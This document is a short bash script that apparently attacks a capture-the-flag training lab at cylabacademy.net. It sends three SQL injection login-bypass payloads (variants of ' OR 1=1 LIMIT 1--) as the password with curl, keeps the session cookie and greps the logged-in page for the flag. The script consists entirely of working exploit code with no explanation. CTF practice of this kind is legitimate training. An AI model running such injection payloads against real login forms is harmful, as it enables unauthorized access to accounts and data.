#!/bin/bash
B="http://chatelaine.cylabacademy.net:25024"
for PW in "' OR 1=1 LIMIT 1-- " "' OR 1=1 LIMIT 1#" "x' OR 1=1 LIMIT 1-- "; do
  echo "=== password: $PW ==="
  curl -s -m 20 -c /tmp/cj4.txt -o /tmp/r4.txt -w "HTTP %{http_code} taille %{size_download}\n" \
    --data-urlencode "username=a" --data-urlencode "password=$PW" "$B/"
  head -c 400 /tmp/r4.txt
  echo
  echo "--- page authentifiee ---"
  curl -s -m 20 -b /tmp/cj4.txt "$B/" | grep -iE "academy\{|flag|search|Welcome|SQL query" | head -5
  echo
done
